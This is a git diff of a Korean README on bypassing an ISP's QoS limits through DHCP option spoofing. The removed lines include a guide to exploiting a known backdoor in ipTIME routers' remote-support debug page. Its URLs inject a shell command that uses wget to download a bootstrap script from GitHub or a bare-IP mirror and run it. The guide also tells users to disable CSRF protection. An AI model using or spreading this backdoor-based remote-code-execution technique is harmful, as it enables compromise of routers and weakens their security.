@@ -162,12 +162,6 @@ OPNsense에서 WAN 인터페이스에 Option 60을 추가하려면 다음과 같
            Client-ID (61), length 7: ether {MAC주소}
    ```
 
-## iptime (신규 펌웨어)
-2026년 6월 17일 업데이트가 진행된 펌웨어 15.3.2 에서 벤더 ID 및 Client ID 수정 기능이 추가 됨. [<a href="https://iptime.com/iptime/?uid=27401&mod=document&page_id=16">지원 모델 참고</a>]
-해당 펌웨어가 지원되는 모델의 경우 수월하게 QoS 우회가 가능해짐.
-
-<img width="1424" alt="iptime_new" src="https://github.com/user-attachments/assets/ed545b8e-748a-47cb-9fc4-d2eb5d64fda5" />
-
 --------------------------------
 
 
@@ -305,34 +299,4 @@ http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dap
 
 --------------------------------
 
---------------------------------
 
-iptime(알파테스트중)
-
-백도어 출처 - https://github.com/tylzars/iptime-debug - 펌웨어 버전 15.10.0, ipTIME A2004S에서 동작 확인됨
-
-위 출처와 같이 iptime 공유기의 '원격 지원'기능에 잠재된 백도어에 접근할 방법이 있는 경우에만 유효합니다
-
-<a href="https://github.com/veilRedeemer/udhcp/releases">미리 빌드된 udhcpc 출처</a>
-
-1. 적용하려는 기기는 '악성 스크립트 접근 방지(CSRF)'기능이 꺼져 있으며, '원격 지원'기능이 켜져 있어야 합니다:
-<img width="285" alt="iptime1" src="https://github.com/user-attachments/assets/ef4882cc-03a4-4478-acd1-a0418048dca0" />
-
-2. 아래 링크 중 하나를 직접 클릭하지 말고 로그인한 관리자 페이지의 주소 칸에 붙여넣어 진행하세요. 관리자 계정/비밀번호를 설정하지 않은 경우 동작하지 않습니다:
-
-http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=wget%20-O%20%2ftmp%2fstart.sh%20https%3a%2f%2fraw.githubusercontent.com%2fveilRedeemer%2fbypassQoSKoreatelecomISP%2frefs%2fheads%2fmain%2fiptime_bootstrap.sh%20%3bchmod%20755%20%2ftmp%2fstart.sh%20%3b%2ftmp%2fstart.sh
-
-  이때 아래와 같은 메시지가 표시된다면 원본 링크의 암호화된 연결을 지원하지 않는 환경이므로 각자 웹서버를 준비하거나 아래에 미리 준비된 미러 링크를 사용해야 합니다
-   
-<img width="498" alt="notls" src="https://github.com/user-attachments/assets/6ee27eda-0b7f-4213-a868-7a118907b1d3" />
-
-   미러 링크는 접속자의 IP 주소와 타임스탬프를 포함한 접속 기록을 저장함에 동의하고 미러 링크를 사용:
-
-http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=wget%20-O%20%2ftmp%2fstart.sh%20http%3a%2f%2f168.138.196.144%2fiptime_bootstrap.sh%20%3bchmod%20755%20%2ftmp%2fstart.sh%20%3b%2ftmp%2fstart.sh
-
-3. 아래와 같이 표시되면 성공. 다운로드한 데이터를 포함한 변경 사항은 특정 공유기 설정을 변경하거나 재시동되거나 전원이 끊어지면 지워집니다:
-<img width="333" alt="iptime2" src="https://github.com/user-attachments/assets/fa6ee8d4-9990-4f80-8d70-8ad551737b36" />
-
-성공적으로 프리미엄 IP를 취득했거나 실패했다면 기기 모델명과 펌웨어 버전, 미러 다운로드 주소 사용여부, 실패 시 출력되는 메세지를 3570kgen@naver.com 에 제보하는 것을 고려해보세요.
-
---------------------------------
